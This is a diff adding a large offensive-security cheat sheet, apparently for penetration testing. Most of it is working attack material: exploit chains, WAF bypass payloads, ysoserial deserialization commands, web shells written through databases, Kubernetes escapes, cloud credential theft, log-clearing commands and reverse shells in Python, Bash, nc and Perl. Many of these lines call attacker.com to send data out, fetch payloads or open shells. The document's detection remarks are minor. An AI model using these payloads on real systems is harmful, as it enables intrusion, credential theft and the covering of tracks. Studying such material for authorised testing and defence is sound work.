@@ -782,6 +782,509 @@ grep -E "xp_cmdshell|INTO OUTFILE|COPY.*PROGRAM|UDF" mysql.log postgresql.log
 
 ---
 
+---
+
+## Extended Exploit Chains
+
+### Chain A: SharePoint → Domain Admin
+```
+SharePoint RCE (unauthenticated)
+    ↓
+Dump SharePoint config DB → service account creds
+    ↓
+Pass-the-hash or crack service account
+    ↓
+Domain service account (often SP_Farm)
+    ↓
+DCSync / Golden Ticket → Domain Admin
+```
+
+**Key targets in SharePoint:**
+- `sp_farm` account (typically Domain Admin)
+- `sp_serviceapp` account (service app pool)
+- SQL Server service account (if on same box)
+
+### Chain B: Langflow → Supply Chain Poison
+```
+Langflow RCE
+    ↓
+Access MLflow model registry
+    ↓
+Poison production model → pickle deserialization
+    ↓
+Downstream consumers load poisoned model
+    ↓
+RCE on all inference endpoints
+```
+
+**Detection:** Look for model artifacts with embedded payloads:
+```python
+# Malicious pickle payload
+import pickle
+import os
+
+class Malicious:
+    def __reduce__(self):
+        return (os.system, ('curl attacker.com/exfil',))
+    
+pickle.dumps(Malicious())
+```
+
+### Chain C: WordPress → cPanel → Full Server
+```
+WP2Shell RCE
+    ↓
+Read wp-config.php → database creds
+    ↓
+Database access → user table (hashed passwords)
+    ↓
+Crack admin hash or session hijack
+    ↓
+cPanel access (if same creds reused)
+    ↓
+File Manager → full server compromise
+```
+
+**Post-exploitation file reads:**
+```bash
+# WordPress config files
+wp-config.php        # DB creds, salts, keys
+.htaccess           # Server configs
+wp-admin/.htaccess  # Admin restrictions
+```
+
+### Chain D: K8s → Cloud → Org-Wide
+```
+K8s node compromise
+    ↓
+ServiceAccount token → cloud provider IAM
+    ↓
+Instance metadata → assume cross-account roles
+    ↓
+Federation/SSO compromise
+    ↓
+Organization-wide cloud access
+```
+
+---
+
+## WAF Bypass Techniques
+
+### Technique 1: JSON Parameter Pollution
+```http
+POST /api/login HTTP/1.1
+Content-Type: application/json
+
+{"username": "admin", "username": "admin' OR '1'='1", "password": "x"}
+```
+
+**Why it works:** Some parsers use first occurrence, others last. WAF checks first, app sees last.
+
+### Technique 2: Unicode Normalization
+```
+Original:  <script>alert(1)</script>
+Encoded:  <%73%63%72%69%70%74%3ealert(1)%3c%2f%73%63%72%69%70%74%3e
+Unicode:  <scrıpt>alert(1)</scrıpt>  (dotless i: U+0131)
+```
+
+### Technique 3: Case-Insensitive Command Injection
+```bash
+# Bypass simple filters
+cAt /EtC/pAsSwD
+$(printf '%s' 'c' 'a' 't') /etc/passwd
+$(echo -e '\x63\x61\x74') /etc/passwd
+```
+
+### Technique 4: Protocol Smuggling
+```http
+# H2.TE desync
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 6
+
+0
+
+G
+```
+
+```http
+# Follow-up request (smuggled)
+POST /admin HTTP/1.1
+Host: target.com
+Content-Length: 15
+
+x=1&cmd=whoami
+```
+
+### Technique 5: Path Traversal with Encoding
+```
+Standard:    ../../../etc/passwd
+URL-encoded: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+Double:      %252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
+UTF-8:       %c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afetc%c0%afpasswd
+```
+
+### Technique 6: NoSQL Injection Bypass
+```javascript
+// MongoDB - bypass auth
+{"username": {"$ne": null}, "password": {"$ne": null}}
+
+// Complex
+{"$where": "this.password == this.password.match(/.*/)[0]"}
+```
+
+---
+
+## Anti-Detection Techniques
+
+### 1. Living Off The Land (LOLBin)
+```powershell
+# PowerShell without powershell.exe
+mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run""calc"",0 : close")
+
+# Certutil for download + execution
+certutil -urlcache -split -f http://attacker.com/shell.exe C:\Windows\Temp\shell.exe
+C:\Windows\Temp\shell.exe
+
+# MSBuild execution (no disk touch)
+C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe shell.xml
+
+# WMI event subscription persistence
+wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="BotFilter", EventNamespace="root\\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent"
+```
+
+### 2. Encrypted Channels
+```bash
+# DNS exfiltration
+cat data.txt | xxd -p | head -c 63 | while read hex; do
+    dig +short @attacker.com "$hex.target.com"
+done
+
+# HTTPS with client cert pinning bypass
+# Use mitmproxy or Burp's CA injection
+
+# WebSocket for C2
+wscat -c wss://attacker.com/c2 -p 443
+```
+
+### 3. Process Injection (Linux)
+```c
+// /proc/pid/mem injection
+// Requires: ptrace capability or /proc/sys/kernel/yama/ptrace_scope = 0
+
+int pid = target_pid;
+int fd = open("/proc/PID/mem", O_RDWR);
+lseek(fd, code_section_offset, SEEK_SET);
+write(fd, shellcode, sizeof(shellcode));
+```
+
+### 4. Log Evasion
+```bash
+# Bash history suppression
+export HISTFILE=/dev/null
+unset HISTFILE
+set +o history
+
+# Alternative shells (no bash logging)
+exec bash --norc --noprofile -i
+
+# Clear existing logs
+# Linux
+shred -zu /var/log/auth.log /var/log/syslog ~/.bash_history
+# Mac
+rm -f ~/.zsh_history ~/.bash_history
+```
+
+### 5. Sandbox Evasion (Cloud)
+```bash
+# Check if in container/VM
+if [ -f /.dockerenv ] || grep -q docker /proc/1/cgroup; then
+    echo "In Docker - escape via privileged container"
+fi
+
+# Check for hypervisor
+systemd-detect-virt
+lsmod | grep -i virtio
+
+# Container escape via privileged mode
+capsh --print | grep cap_sys_admin
+# If present: mount host filesystem
+mkdir /tmp/host
+mount /dev/sda1 /tmp/host
+```
+
+---
+
+## ysoserial Extended Gadget Chains
+
+### Java Deserialization
+```bash
+# CommonsCollections1 - InvokerTransformer
+ysoserial CommonsCollections1 'curl attacker.com/$(whoami)'
+
+# CommonsCollections2 - PriorityQueue + TransformingComparator
+ysoserial CommonsCollections2 'nc -e /bin/sh attacker.com 4444'
+
+# CommonsCollections3 - InstantiateTransformer + TemplatesImpl
+ysoserial CommonsCollections3 '/Applications/Calculator.app/Contents/MacOS/Calculator'
+
+# CommonsCollections4 - TransformingComparator + InstantiateTransformer
+ysoserial CommonsCollections4 'powershell -enc ...'
+
+# CommonsCollections5 - LazyMap + TiedMapEntry
+ysoserial CommonsCollections5 'wget -O /tmp/shell http://attacker.com/shell'
+
+# CommonsCollections6 - HashSet + TiedMapEntry
+ysoserial CommonsCollections6 'bash -c bash$IFS$9-i$IFS$9>&/dev/tcp/attacker.com/4444'
+
+# CommonsCollections7 - Hashtable + LazyMap
+ysoserial CommonsCollections7 'python3 -c "import socket,subprocess,os; ..."'
+
+# Spring1 - AspectJAdviceDependency + MethodInvocation
+ysoserial Spring1 'touch /tmp/pwned'
+
+# Spring2 - HotSwappableTargetSource
+ysoserial Spring2 'id'
+
+# Jdk7u21 - TemplatesImpl (no dependencies)
+ysoserial Jdk7u21 'calc.exe'
+
+# JRE8u20 - Bypass latest patches
+ysoserial JRE8u20 'curl http://attacker.com/exfil'
+```
+
+### .NET Deserialization (ysoserial.net)
+```powershell
+# ActivitySurrogateSelector - Most common
+ysoserial.net -f BinaryFormatter -g ActivitySurrogateSelector -o base64 -c "calc.exe"
+
+# TextFormattingRunProperties - Office/Outlook
+ysoserial.net -f BinaryFormatter -g TextFormattingRunProperties -o base64 -c "notepad.exe"
+
+# WindowsIdentity - ClaimsIdentity gadget
+ysoserial.net -f BinaryFormatter -g WindowsIdentity -o base64 -c "powershell -enc ..."
+
+# SessionSecurityToken - WCF/SAML
+ysoserial.net -f BinaryFormatter -g SessionSecurityToken -o base64 -c "whoami"
+
+# DataSet - DataTable gadget (no type constraints)
+ysoserial.net -f BinaryFormatter -g DataSet -o base64 -c "certutil -urlcache -f http://attacker.com/shell.exe"
+
+# ObjectDataProvider - WPF/XAML
+ysoserial.net -f BinaryFormatter -g ObjectDataProvider -o base64 -c "mshta vbscript:Execute('...')"
+```
+
+---
+
+## Cloud Lateral Movement Matrix
+
+| From | To | Technique | Detection |
+|------|-----|-----------|-----------|
+| EC2 | S3 | Instance profile | CloudTrail `AssumeRole` |
+| EC2 | Lambda | Pass role + invoke | `CreateFunction20150331` |
+| Lambda | EC2 | `RunInstances` with user-data | Launch unusual AMIs |
+| IAM User | Cross-account | `sts:AssumeRole` | External account activity |
+| Container | Host | Privileged escape | `CAP_SYS_ADMIN` in audit |
+| Pod | Node | `hostPath` mount | Volume mount `/` |
+| Node | Cluster | ServiceAccount token theft | Token reuse across nodes |
+| GCP VM | Project-wide | Default service account | OAuth scope expansion |
+| Azure VM | Storage | Managed identity | MSI token exfil |
+
+### AWS Specific Lateral Moves
+```bash
+# List instance profiles attached to EC2
+aws iam list-instance-profiles-for-role --role-name ec2-role
+
+# Extract instance metadata tokens (IMDSv2)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
+curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Pivot to S3 with instance creds
+export AWS_ACCESS_KEY_ID=$(jq -r .AccessKeyId creds.json)
+export AWS_SECRET_ACCESS_KEY=$(jq -r .SecretAccessKey creds.json)
+export AWS_SESSION_TOKEN=$(jq -r .Token creds.json)
+aws s3 ls s3://target-bucket/ --recursive
+
+# Lambda backdooring (persistence)
+aws lambda update-function-code --function-name target --zip-file fileb://backdoor.zip
+
+# CloudFormation stack drift (privilege escalation)
+aws cloudformation create-stack --stack-name malicious --template-url http://attacker.com/privesc.yaml
+```
+
+---
+
+## Kubernetes Escape Variants
+
+### Variant A: hostPath Mount Escape
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: escape-hostpath
+spec:
+  containers:
+  - name: escape
+    image: alpine
+    command: ["sh", "-c", "sleep 999999"]
+    volumeMounts:
+    - mountPath: /host
+      name: host
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
+```
+
+### Variant B: Privileged Container + Kernel Exploit
+```yaml
+securityContext:
+  privileged: true
+  capabilities:
+    add:
+    - CAP_SYS_ADMIN
+    - CAP_SYS_PTRACE
+    - CAP_SYS_MODULE
+```
+
+**Exploit:**
+```bash
+# Load kernel module from privileged container
+insmod /host/lib/modules/$(uname -r)/kernel/exploit.ko
+
+# Or escape via nsenter
+nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
+```
+
+### Variant C: hostPID Access
+```yaml
+spec:
+  hostPID: true
+  containers:
+  - name: escape
+    command: ["sh", "-c", "cd /proc/1/root && chroot . /bin/sh"]
+```
+
+### Variant D: ServiceAccount Token Projection
+```bash
+# If pod uses projected service account tokens
+ls /var/run/secrets/kubernetes.io/serviceaccount/
+
+# Token has limited audience/lifetime - steal and use quickly
+cat /var/run/secrets/kubernetes.io/serviceaccount/token | jwt decode -
+```
+
+---
+
+## Database → OS Command Chains
+
+### MySQL
+```sql
+-- File write → PHP execution
+SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+-- Plugin-based RCE
+SELECT * FROM mysql.func WHERE name='sys_eval';  -- Check for UDF
+
+-- Alternative: general_log
+SET GLOBAL general_log='ON';
+SET GLOBAL general_log_file='/var/www/html/log.php';
+SELECT '<?php eval($_GET[1]);?>';
+```
+
+### PostgreSQL
+```sql
+-- COPY TO PROGRAM (9.3+)
+COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(whoami)';
+
+-- pg_read_file + lo_import
+SELECT pg_read_file('/etc/passwd', 0, 1000);
+
+-- pg_execute_server_program (10+)
+SELECT * FROM pg_read_server_program('id');
+```
+
+### SQL Server
+```sql
+-- Enable xp_cmdshell
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+
+-- Execute
+EXEC xp_cmdshell 'powershell -enc JABzAD0ATgBlAHcALQBPAGIA...';
+
+-- Alternative: sp_OACreate
+DECLARE @s INT; 
+EXEC sp_OACreate 'WScript.Shell', @s OUT; 
+EXEC sp_OAMethod @s, 'Run', NULL, 'cmd.exe /c calc.exe', 0, 1;
+```
+
+### Oracle
+```sql
+-- Java stored procedure
+CREATE OR REPLACE FUNCTION javacmd(cmd IN VARCHAR2) RETURN VARCHAR2 AS
+LANGUAGE JAVA NAME 'java.lang.Runtime.getRuntime().exec(java.lang.String)';
+
+-- PL/SQL with dbms_pipe/dbms_alert
+BEGIN
+  DBMS_SCHEDULER.create_job(
+    job_name => 'rce',
+    job_type => 'EXECUTABLE',
+    job_action => '/bin/sh',
+    number_of_arguments => 2,
+    enabled => FALSE
+  );
+  DBMS_SCHEDULER.set_job_argument_value('rce', 1, '-c');
+  DBMS_SCHEDULER.set_job_argument_value('rce', 2, 'whoami');
+  DBMS_SCHEDULER.enable('rce');
+END;
+```
+
+---
+
+## Payload Delivery Optimization
+
+### Stage 1: Reconnaissance
+```bash
+# Quick wins - what can we execute?
+which python3 python perl ruby nc nc.traditional
+ls -la /bin/bash /bin/sh /bin/dash
+id; uname -a; cat /etc/os-release
+```
+
+### Stage 2: Stable Reverse Shell
+```bash
+# Python - most reliable
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh"])'
+
+# Bash - if python unavailable
+bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
+
+# nc - traditional
+nc.traditional -e /bin/sh attacker.com 4444
+
+# Perl
+perl -e 'use Socket;$i="attacker.com";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+```
+
+### Stage 3: Upgrade to PTY
+```bash
+# In limited shell
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# or
+script -qc /bin/bash /dev/null
+
+# Background with Ctrl+Z, then:
+stty raw -echo; fg
+export SHELL=bash
+export TERM=xterm-256color
+stty rows 50 columns 132
+```
+
+---
+
 *Last updated: 2026-07-23*  
 *Sources: CISA KEV, NVD, vendor advisories, PoC-in-GitHub*  
 *Scope: Authorized security testing only*
